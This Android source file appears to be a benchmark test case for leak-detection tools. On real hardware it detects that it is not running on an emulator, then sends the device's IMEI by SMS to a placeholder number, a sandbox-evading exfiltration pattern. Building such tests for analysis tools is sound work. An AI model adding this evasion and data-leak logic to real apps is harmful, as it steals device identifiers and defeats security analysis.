package com.example.newedtester;

import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.TextView;

/**
 * @testcase_name EmulatorDetection_Bluetooth1
 * @version 0.1
 * @author Malviya National Institute of Technology, Jaipur INDIA 
 * @author_mail jyotigajrani@gmail.com
 * 
 * @description This test detects the Android emulator by checking the bluetooth.
 * The non-presence of Bluetooth sensor identify the environment as Emulator. This
 * app send IMEI number  via SMS if the app runs on a real phone.
 * @dataflow onCreate: imei -> SMS 
 * @number_of_leaks 1
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		TextView txtStatus;

		String status = "Can't Detect";
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		   BluetoothAdapter ba = BluetoothAdapter.getDefaultAdapter();
		     if (ba == null)
		     {
		     	status = "\tBluetooth: Emulator";
		     }
		     else
		     {
		    	 TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
             	String imei = telephonyManager.getDeviceId(); 
             	
     			SmsManager sm = SmsManager.getDefault();
     	    	String number = "+49 1234";
     	    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
		    	 status = "\tBluetooth: Device";
		     }
		txtStatus.setText(status);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}